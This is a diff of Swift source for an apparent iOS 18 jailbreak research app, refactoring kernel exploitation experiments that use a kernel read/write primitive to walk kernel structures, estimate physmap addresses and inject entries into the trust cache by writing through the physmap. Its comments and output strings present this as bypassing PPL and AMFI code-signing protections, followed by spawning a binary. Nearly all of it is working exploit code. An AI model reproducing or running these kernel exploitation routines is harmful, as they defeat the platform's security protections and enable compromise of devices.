@@ -36,7 +36,16 @@ private enum PhysmapConstants {
     }
 
     static func loadOrDefault() -> (gVirtBase: UInt64, gPhysBase: UInt64) {
-        load() ?? (0xffffffde9a094000, defaultGPhysBase)
+        if let saved = load() { return saved }
+        let proc = ds_get_our_proc()
+        return (estimateZoneMapBase(ourProc: proc), defaultGPhysBase)
+    }
+
+    /// gVirtBase ≈ zone_map_min on A12 iOS 18.x (derived from proc, not fixed per boot).
+    static func estimateZoneMapBase(ourProc: UInt64) -> UInt64 {
+        guard ourProc > 0xffffffd000000000 else { return 0xffffffdcda524000 }
+        let block = ourProc & 0xFFFFFFFFF0000000
+        return block &- 0x31ADD000
     }
 
     static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }
@@ -135,7 +144,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("Urutan: 74 → 77 probe → 77 inject → spawn. Step ③ bisa panic (APRR/PPL) — backup dulu. Jangan tutup app saat berjalan.")
+                Text("Exp 74 pakai KRW saja (tanpa launchd) agar aman. Urutan: 74 → 77 probe → 77 inject. Jangan tutup app saat berjalan.")
                     .font(.system(size: 9))
             }
 
@@ -277,15 +286,41 @@ struct AMFIExperimentView: View {
         #endif
     }
 
+    /// Exp 74 is KRW-only — must NOT hold launchd (IOSurface + long KRW = initproc panic).
     private func runExp74() {
-        runExperiment(label: "Physmap", operation: "exp74_physmap", append: true) { rc in
-            self.expPhysmapAccess(rc: rc)
+        isRunning = true
+        runningLabel = "Physmap"
+        guard mgr.dsready else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expPhysmapAccess()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
         }
     }
 
+    /// Probe is read-only KRW — avoid holding launchd (same class of panic as Exp 74).
     private func runExp77Probe() {
-        runExperiment(label: "TC Probe", operation: "exp77_probe", append: true) { rc in
-            self.expTrustCacheWrite(rc: rc, dryRun: true)
+        isRunning = true
+        runningLabel = "TC Probe"
+        guard mgr.dsready else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expTrustCacheWrite(rc: nil, dryRun: true)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
         }
     }
 
@@ -3598,64 +3633,24 @@ struct AMFIExperimentView: View {
     /// On A12 iOS 18.2:
     ///   physmap_base ≈ 0xfffffff000000000 (gVirtBase) - 0x800000000 (gPhysBase) + kernel_base
     ///   OR: physmap is at a fixed offset from kernel base
-    private func expPhysmapAccess(rc: RemoteCall) -> ExperimentResult {
-        var detail = "Experiment 74: Physmap Direct Access\n"
-        detail += "=====================================\n\n"
-        
-        // Step 1: Get kernel base and slide
+    /// Pure KRW — no launchd RC, no IOKit/IOSurface (prevents initproc panic).
+    private func expPhysmapAccess() -> ExperimentResult {
+        var detail = "Experiment 74: Physmap Direct Access (KRW-only, safe)\n"
+        detail += "====================================================\n\n"
+
         let kernBase = ds_get_kernel_base()
         let kernSlide = ds_get_kernel_slide()
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
         detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"
-        
-        // Step 2: Calculate potential physmap base addresses
-        // On iOS, the physmap (direct map of physical RAM) is typically:
-        // - At gVirtBase (which maps physical 0x0 to some virtual address)
-        // - Formula: virt_for_phys(pa) = pa - gPhysBase + gVirtBase
-        //
-        // Known values from exp 72:
-        //   gPhysBase = 0x800000000 (DRAM start on A12)
-        //   gVirtBase = 0xfffffff000000000 (estimated)
-        //
-        // But the REAL physmap might be different. Let's probe.
-        
-        let gPhysBase: UInt64 = 0x800000000
-        // gVirtBase is typically kernBase rounded down, or a known constant
-        // On iOS 18, it's often: 0xfffffff000000000 + slide
-        let gVirtBase: UInt64 = 0xfffffff000000000 + kernSlide
-        
-        detail += "Estimated gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
-        detail += "Estimated gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n\n"
-        
-        // Step 3: Create PurpleGfxMem surface (optional — for future physical memory tests)
-        guard let sb = dspmgr.shared.sbProc else {
-            return ExperimentResult(name: "Physmap Access", success: false, detail: "No SB RC", timestamp: Date())
-        }
-        
-        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
-        let nsNumClass = remote_getClass(sb, "NSNumber")
-        let numWithInt = remote_sel(sb, "numberWithInteger:")
-        let dictNew = remote_sel(sb, "new")
-        let setObj = remote_sel(sb, "setObject:forKey:")
-        
-        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
-        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
-        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
-        
-        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
-        if gfxSurface != 0 {
-            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
-            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
-            if gfxBase != 0 {
-                sb[gfxBase].setValue64(0x5048313553_4D4150)
-                detail += "GfxMem base: 0x\(String(format: "%llx", gfxBase)) (marker written)\n\n"
-            }
-            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
-        } else {
-            detail += "GfxMem surface failed (non-critical, continuing)\n\n"
-        }
-        
-        // Step 4: Test if socket KRW can read OUTSIDE proc/task zone
+
+        let gPhysBase: UInt64 = PhysmapConstants.defaultGPhysBase
+        let ourProc = ds_get_our_proc()
+        let zoneMapEst = PhysmapConstants.estimateZoneMapBase(ourProc: ourProc)
+        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
+        detail += "Zone map (est): 0x\(String(format: "%llx", zoneMapEst))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
+
+        // Step 2: Test if socket KRW can read OUTSIDE proc/task zone
         // Key question: is our KRW truly zone-limited, or can it read any kernel VA?
         // Test by reading kernel __TEXT header (Mach-O magic) — different zone from proc
         
@@ -3685,17 +3680,15 @@ struct AMFIExperimentView: View {
         detail += "\n=== Pointer Chain: proc→task→map→pmap→tte/ttep ===\n"
         detail += "(Using existing taskbyproc() — handles PAC internally)\n\n"
         
-        // Zone bounds for validation
-        let zoneMin: UInt64 = 0xffffffde9a094000
-        let zoneMax: UInt64 = 0xffffffe49a094000
-        
+        // Kernel heap / zone range (wide — zone map shifts every boot)
         func isZonePtr(_ v: UInt64) -> Bool {
-            return v >= zoneMin && v < zoneMax
+            return v >= 0xffffffdc00000000 && v < 0xffffffe400000000
         }
-        
-        let ourProc = ds_get_our_proc()
-        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
-        
+
+        func isPhysmapVA(_ va: UInt64, zoneBase: UInt64) -> Bool {
+            return va >= zoneBase && va < zoneBase &+ 0x800000000
+        }
+
         // Use existing taskbyproc() which handles proc_ro + PAC correctly
         let taskAddr = taskbyproc(ourProc)
         detail += "task (via taskbyproc): 0x\(String(format: "%llx", taskAddr))\n"
@@ -3704,21 +3697,12 @@ struct AMFIExperimentView: View {
         guard taskAddr != 0 && isZonePtr(taskAddr) else {
             detail += "❌ taskbyproc returned invalid address\n"
             detail += "task might need additional PAC handling\n"
-            // Dump proc_ro for debugging
-            let procRoRaw = ds_kread64(ourProc + UInt64(off_proc_p_proc_ro))
+            let procRoRaw = ds_kread64_safe(ourProc + UInt64(off_proc_p_proc_ro))
             detail += "\nDebug: proc_ro raw = 0x\(String(format: "%llx", procRoRaw))\n"
-            let taskRaw = ds_kread64(procRoRaw + UInt64(off_proc_ro_pr_task))
+            let taskRaw = ds_kread64_safe(procRoRaw + UInt64(off_proc_ro_pr_task))
             detail += "Debug: task raw (proc_ro+0x8) = 0x\(String(format: "%llx", taskRaw))\n"
             detail += "In zone: \(isZonePtr(taskRaw))\n"
-            
-            // Try reading from task raw directly
-            if isZonePtr(taskRaw) {
-                detail += "\n→ Using raw task value directly\n"
-                // Continue with taskRaw below
-            }
-            
-            let success = false
-            return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "Physmap Access (Exp 74)", success: false, detail: detail, timestamp: Date())
         }
         
         // Step: task→vm_map (scan +0x20 to +0x40 for zone pointer with valid links)
@@ -3740,14 +3724,13 @@ struct AMFIExperimentView: View {
         }
         
         guard vmMap != 0 else {
-            detail += "vm_map not found. task dump:\n"
-            for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
+            detail += "vm_map not found. task dump (+0x00..0x38):\n"
+            for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
                 let v = ds_kread64_safe(taskAddr + off)
-                let tag = isZonePtr(v) ? " ← zone" : ""
+                let tag = isZonePtr(v) ? " ← heap" : ""
                 detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(tag)\n"
             }
-            let success = false
-            return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "Physmap Access (Exp 74)", success: false, detail: detail, timestamp: Date())
         }
         
         // Step: vm_map→pmap at +0x50 (confirmed iOS 18.2 layout from research)
@@ -3821,27 +3804,28 @@ struct AMFIExperimentView: View {
                 
                 // Let's try: gVirtBase = 0xffffffde9a094000 (from our panic log)
                 // This is device-specific but doesn't change between reboots on same iOS
-                let gVirtBaseCandidates: [(String, UInt64)] = [
-                    ("zone_map_base", 0xffffffde9a094000),
+                var gVirtBaseCandidates: [(String, UInt64)] = [
+                    ("zone_from_proc", zoneMapEst),
+                    ("saved", PhysmapConstants.load()?.gVirtBase ?? 0),
                     ("tte & ~0xFFFFFF", tte & 0xffffff0000000000),
-                    ("0xffffffde00000000", 0xffffffde00000000),
-                    ("0xffffffdd00000000", 0xffffffdd00000000),
                 ]
-                
+                gVirtBaseCandidates = gVirtBaseCandidates.filter { $0.1 != 0 }
+
                 detail += "=== Testing gVirtBase candidates ===\n"
                 detail += "(gPhysBase = 0x800000000, tte = 0x\(String(format: "%llx", tte)))\n\n"
-                
+
                 for (name, gVirtBaseCandidate) in gVirtBaseCandidates {
-                    // Compute what ttep would be
                     let ttepCalc = tte &- gVirtBaseCandidate &+ gPhysBase
-                    
-                    // ttep should be a reasonable physical address
-                    // A12 iPhone XR has 3GB RAM: phys range 0x800000000 - 0x8C0000000
                     let reasonable = ttepCalc >= 0x800000000 && ttepCalc < 0x900000000
-                    
-                    // VERIFY: read kernBase via this physmap
+
                     let kernPhys = kernBase &- gVirtBaseCandidate &+ gPhysBase
                     let physmapVA = gVirtBaseCandidate &+ (kernPhys &- gPhysBase)
+
+                    guard isPhysmapVA(physmapVA, zoneBase: gVirtBaseCandidate) else {
+                        detail += "\(name): skip — physmapVA out of range\n"
+                        continue
+                    }
+
                     let verifyVal = ds_kread64_safe(physmapVA)
                     let matches = verifyVal == kernMagic && kernMagic != 0
                     
@@ -3887,7 +3871,7 @@ struct AMFIExperimentView: View {
     /// KEY INSIGHT: PPL protects VIRTUAL page permissions. The physmap is a SEPARATE
     /// virtual mapping of the same physical memory with DIFFERENT permissions.
     /// Writing through physmap bypasses PPL's page table protections entirely.
-    private func expTrustCacheWrite(rc: RemoteCall, dryRun: Bool = false) -> ExperimentResult {
+    private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
         let expName = dryRun ? "Trust Cache Probe (Exp 77)" : "🏆 FULL JAILBREAK (Exp 77)"
         var detail = dryRun
             ? "Experiment 77: Trust Cache Probe (read-only)\n"
@@ -4314,14 +4298,19 @@ struct AMFIExperimentView: View {
         if verifyH == 0x4141414141414141 {
             detail += "✅✅✅ PHYSMAP WRITE SUCCESSFUL — PPL BYPASSED! ✅✅✅\n\n"
             
-            // Step 6: Try to spawn a binary
+            // Step 6: Try to spawn a binary (requires launchd — inject path only)
             detail += "=== Step 6: Testing binary execution ===\n"
-            detail += "Spawning /usr/bin/id (already trusted, sanity check)...\n"
-            
-            let spawnResult = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "post-inject /usr/bin/id")
-            detail += "Result: \(spawnResult.success ? "✅" : "❌") \(spawnResult.detail)\n\n"
-            
-            if spawnResult.success {
+            var spawnOk = false
+            if let rc {
+                detail += "Spawning /usr/bin/id (already trusted, sanity check)...\n"
+                let spawnResult = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "post-inject /usr/bin/id")
+                detail += "Result: \(spawnResult.success ? "✅" : "❌") \(spawnResult.detail)\n\n"
+                spawnOk = spawnResult.success
+            } else {
+                detail += "Skipped spawn (no launchd RC)\n\n"
+            }
+
+            if spawnOk {
                 detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n"
                 detail += "TRUST CACHE INJECTION VIA PHYSMAP WORKS!\n"
                 detail += "PPL COMPLETELY BYPASSED!\n"
